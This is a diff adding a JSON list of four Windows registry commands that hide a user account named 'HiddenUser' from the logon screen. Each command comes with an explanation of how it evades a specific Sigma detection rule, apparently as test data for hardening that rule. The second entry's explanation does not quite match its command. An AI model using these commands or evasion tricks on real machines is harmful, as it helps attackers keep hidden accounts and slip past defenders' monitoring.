@@ -1,0 +1,18 @@
+[
+  {
+    "output": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v \"HiddenUser\" /d 0x0 /t REG_DWORD /f",
+    "explanation": "The original Sigma rule explicitly looks for the string '/d 0'. By providing the value in hexadecimal format ('0x0'), the logic is bypassed because the string literal check fails while the functional result (setting the registry value to 0) remains the same."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v \"HiddenUser\" /d \"0\"",
+    "explanation": "The Sigma rule checks for 'Image|endswith: \\reg.exe'. If the attacker renames 'reg.exe' to something else (e.g., 'update.exe') or uses the 'reg' alias without the '.exe' extension in environments where the monitor expects the full binary name, it may evade detection depending on how the EDR/SIEM normalizes the 'Image' field."
+  },
+  {
+    "output": "powershell.exe -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' -Name 'HiddenUser' -Value 0 -PropertyType DWord\"",
+    "explanation": "The rule is strictly limited to the execution of 'reg.exe'. Using alternative living-off-the-land binaries (LoLBins) like PowerShell, or direct API calls via C# or Python, completely bypasses this command-line based detection."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v \"HiddenUser\" /d 00",
+    "explanation": "The rule specifically looks for the exact string '/d 0'. Using '/d 00' or adding extra spaces between the flag and the value (if the parser is strict) can break the string-matching logic while still being interpreted as zero by the registry tool."
+  }
+]
